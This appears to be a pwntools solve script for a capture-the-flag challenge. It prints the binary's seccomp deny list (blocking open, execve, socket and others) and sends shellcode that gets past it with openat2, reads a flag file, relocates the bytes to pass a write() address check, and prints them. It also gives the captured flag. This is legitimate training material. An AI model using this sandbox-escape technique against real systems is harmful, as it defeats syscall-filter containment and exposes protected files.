from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./new_age')
gdb.attach(p, '''
    brva 0x1544
    continue
''')

# p = remote('159.89.106.147', 1337)

#  line  CODE  JT   JF      K
# =================================
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x1c 0xc000003e  if (A != ARCH_X86_64) goto 0030
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x19 0xffffffff  if (A != 0xffffffff) goto 0030
#  0005: 0x15 0x18 0x00 0x00000002  if (A == open) goto 0030
#  0006: 0x15 0x17 0x00 0x00000028  if (A == sendfile) goto 0030
#  0007: 0x15 0x16 0x00 0x00000029  if (A == socket) goto 0030
#  0008: 0x15 0x15 0x00 0x0000002a  if (A == connect) goto 0030
#  0009: 0x15 0x14 0x00 0x00000038  if (A == clone) goto 0030
#  0010: 0x15 0x13 0x00 0x00000039  if (A == fork) goto 0030
#  0011: 0x15 0x12 0x00 0x0000003a  if (A == vfork) goto 0030
#  0012: 0x15 0x11 0x00 0x0000003b  if (A == execve) goto 0030
#  0013: 0x15 0x10 0x00 0x000000a1  if (A == chroot) goto 0030
#  0014: 0x15 0x0f 0x00 0x00000101  if (A == openat) goto 0030
#  0015: 0x15 0x0e 0x00 0x00000142  if (A == execveat) goto 0030
#  0016: 0x15 0x0d 0x00 0x000001b3  if (A == 0x1b3) goto 0030
#  0017: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0023
#  0018: 0x20 0x00 0x00 0x0000001c  A = buf >> 32 # read(fd, buf, count)
#  0019: 0x25 0x09 0x00 0x0000753c  if (A > 0x753c) goto 0029
#  0020: 0x15 0x00 0x09 0x0000753c  if (A != 0x753c) goto 0030
#  0021: 0x20 0x00 0x00 0x00000018  A = buf # read(fd, buf, count)
#  0022: 0x35 0x06 0x07 0xf6829c00  if (A >= 0xf6829c00) goto 0029 else goto 0030
#  0023: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0029
#  0024: 0x20 0x00 0x00 0x0000001c  A = buf >> 32 # write(fd, buf, count)
#  0025: 0x25 0x04 0x00 0x0000753c  if (A > 0x753c) goto 0030
#  0026: 0x15 0x00 0x02 0x0000753c  if (A != 0x753c) goto 0029
#  0027: 0x20 0x00 0x00 0x00000018  A = buf # write(fd, buf, count)
#  0028: 0x25 0x01 0x00 0xf6829400  if (A > 0xf6829400) goto 0030
#  0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
#  0030: 0x06 0x00 0x00 0x00000000  return KILL

shellcode = asm(shellcraft.pushstr('./flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt'))
shellcode += asm('''
    /* =======================================================
     * Step 1: Push filename onto stack
     * -------------------------------------------------------
     * shellcraft.pushstr():
     *   - Pushes the filename onto the stack in reverse order
     *   - Appends a NULL terminator
     *
     * Stack layout (high → low):
     *   [ 'f' 'l' 'a' 'g' ... '\0' ]
     *
     * After pushstr:
     *   rsp points to the beginning of the filename string,
     *   which can be directly used as a C-style string pointer.
     * ======================================================= */

    /* rsi = filename pointer */
    mov rsi, rsp

    /* =======================================================
     * Step 2: openat2()
     * -------------------------------------------------------
     * We use openat2 instead of open to bypass syscall filters.
     * The open_how structure must be 24 bytes and zeroed.
     *
     * rax = 437            (syscall: openat2)
     * rdi = AT_FDCWD (-100)
     * rsi = filename
     * rdx = &open_how
     * r10 = sizeof(open_how) = 24
     * ======================================================= */

    /* Allocate open_how (24 bytes, all zeros) on stack */
    push 0
    push 0
    push 0
    mov rdx, rsp

    mov rax, 437          /* SYS_openat2 */
    mov rdi, -100         /* AT_FDCWD */
    mov r10, 24           /* sizeof(open_how) */
    syscall

    /* Save returned file descriptor */
    mov r12, rax

    /* =======================================================
     * Step 3: read()
     * -------------------------------------------------------
     * Read file contents into stack memory.
     *
     * Compliance note:
     * Stack addresses are high (e.g. 0x7ffe...),
     * which are >= code_region + 0xc00, so read() is allowed.
     * ======================================================= */

    /* Reserve stack space for file contents */
    sub rsp, 0x200         /* 512-byte buffer */

    mov rax, 0             /* SYS_read */
    mov rdi, r12           /* fd */
    mov rsi, rsp           /* buf (stack, high address) */
    mov rdx, 0x100         /* max bytes */
    syscall

    /* Save read size and source buffer */
    mov r13, rax           /* bytes_read */
    mov r14, rsp           /* src = stack buffer */

    /* =======================================================
     * Step 4: memcpy (Stack → Code Region)
     * -------------------------------------------------------
     * Goal:
     *   Move data from a high address (stack) to a low address
     *   (code region), since write() is restricted to
     *   addresses < code_region + 0x400.
     *
     * Strategy:
     *   Use RIP-relative addressing to locate a safe writable
     *   region near the shellcode.
     * ======================================================= */

    /* Destination: writable area in code region */
    lea rdi, [rip + 0x100]

    /* Save destination pointer for write() */
    mov r15, rdi

    /* Source buffer */
    mov rsi, r14

    /* Length = actual bytes read */
    mov rcx, r13

    /* Copy bytes: [rsi] → [rdi] */
    rep movsb

    /* =======================================================
     * Step 5: write()
     * -------------------------------------------------------
     * Write file contents to stdout.
     *
     * Compliance note:
     * Buffer now resides in the code region (low address),
     * so write() is permitted.
     * ======================================================= */

    mov rax, 1             /* SYS_write */
    mov rdi, 1             /* stdout */
    mov rsi, r15           /* buf (code region) */
    mov rdx, r13           /* count */
    syscall

    /* =======================================================
     * Step 6: exit()
     * ======================================================= */
    mov rax, 60            /* SYS_exit */
    xor rdi, rdi
    syscall
''')
p.sendafter(b"Send shellcode (max 4096 bytes): \n", shellcode)

p.interactive()

# 0xL4ugh{D0n'tF000rgoot_k33p_up_Ieesss_withhhh_n3w_5y5c4llsssss5s5s5sss}